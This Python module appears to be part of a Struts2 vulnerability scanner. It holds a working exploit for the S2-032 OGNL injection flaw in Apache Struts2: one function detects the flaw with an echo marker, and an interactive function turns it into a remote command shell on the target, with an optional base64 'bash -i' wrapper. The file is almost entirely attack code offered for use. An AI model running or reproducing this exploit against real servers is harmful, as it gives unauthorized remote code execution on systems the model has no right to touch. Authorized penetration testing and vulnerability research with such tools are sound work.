#!/usr/bin/env python
# coding=utf-8
import base64
import urllib
import requests
import urllib3
urllib3.disable_warnings()
from cve.Struts.Struts2scan_main.module.proxy import proxies
from cve.Struts.Struts2scan_main.module.color import color
from requests.exceptions import ConnectionError
from requests.exceptions import ConnectTimeout
from requests.exceptions import Timeout
import re

def s2_032(url):
    print("[*] 开始检测S2-032")
    vul_nname = "s2_032"
    cmd = 'echo 78468794903108696'
    headers = {
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69",
    }
    
    path = r'/?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd='+cmd
    # r'/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=echo 266783241265356465'
    #删掉了index.action
 
    try:
        vurl = urllib.parse.urljoin(url, path)
        req = requests.get(vurl, headers=headers, timeout=15, verify=False,proxies = proxies)
        if "78468794903108696" in req.text and re.search("echo.{0,10}" + "78468794903108696", req.text) == None:
            print(color.red("[+]")+"存在漏洞：%s" % vul_nname)
    except:
        pass


def s2_032_exp(url):
    try:
        cmdtype = input("命令模式：[1]默认;[2*]base64 : ")
    except:exit()

    if cmdtype == "2":
        print("[2]base64命令模式")
    else:
        print("[1]默认模式")

    while 1:
        try:
            cmd = input("> ")
            if cmd == '':continue
            if cmd == 'exit':exit()
        except:exit()

        if cmdtype == "2":
            cmd = "bash -c {echo,"+str(base64.b64encode(cmd.encode('utf-8')),'utf-8')+"}|{base64,-d}|{bash,-i}"
            cmd = cmd.replace('+','%2B')
            
        headers = {
            "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69",
        }
        path = r'/?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd='+cmd
        try:
            vurl = urllib.parse.urljoin(url, path)
            req = requests.get(vurl, headers=headers, timeout=15, verify=False,proxies = proxies)
            print(req.text)
        except ConnectionError as e:  
            print("[!]网络链接错误/代理异常")
            exit()
        except ConnectTimeout as e:  
            print("[!]连接远程服务器超时异常")
            exit()
        except Timeout as e:  
            print("[!]请求URL超时，产生超时异常")
            exit()
        except:pass